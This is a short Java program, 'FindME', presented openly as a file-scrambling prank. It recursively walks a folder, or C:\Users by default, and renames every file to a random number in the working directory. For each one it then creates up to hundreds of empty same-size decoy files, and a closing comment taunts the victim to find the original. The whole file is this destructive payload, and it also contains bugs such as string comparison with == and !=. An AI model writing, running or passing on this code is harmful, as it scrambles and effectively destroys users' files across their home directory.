import java.io.*;
import java.util.*;

public class FindME {

    /*It can operate in a specific folder or by default in the Users folder*/
    public static void main(String[] args) throws IOException{
        if(args[0] != ""){
            FolderSearch(new File(args[0]));
        }else{
            FolderSearch(new File("C:\\Users\\"));
        }
    }

    /*
    Search recursively folder by folder,
    and in each folder runs FileRep
    forf = "File Or Folder" :)
    */
    private static void FolderSearch(File forf) throws IOException {
        if( forf.isDirectory() ){
            File[] cont = forf.listFiles();
            for( File i : cont ){
                FolderSearch(i);
            }
        }else if(forf.isFile()){
            FileRep(forf);
        }
    }

    /*
    Takes the name of a file and creates 
    random number of apparently equal files
    but this only match in size, format
    but not in content,making it difficult to find
    the real file.
    orfl = "Original File" ;)
    */
    private static void FileRep(File orfl) throws IOException {
        long orsz = orfl.length();
        String chg = Integer.toString((int)(Math.random() * 500 ));
        int reps = 0;
        while(reps <= Integer.parseInt(chg)){
            reps = (int)(Math.random() * 500 );
        }

        //Rename original file to random number so it cant be found
        String ext = (orfl.getPath()).substring((orfl.getPath()).indexOf("."), (orfl.getPath()).length());
        orfl.renameTo(new File(chg +  ext));

        for(int i = 0; i < reps; i++){
            if( Integer.toString(i) == chg ){
                continue;
            }else{
                File cpfl = new File(Integer.toString(i) + ext );
                cpfl.createNewFile();
                RandomAccessFile eqsz = new RandomAccessFile(cpfl,"rw");
                eqsz.setLength(orsz);
                eqsz.close();
            }
        }

    }
}

/* All you have to do now, is find your original file, enjoy!! :P */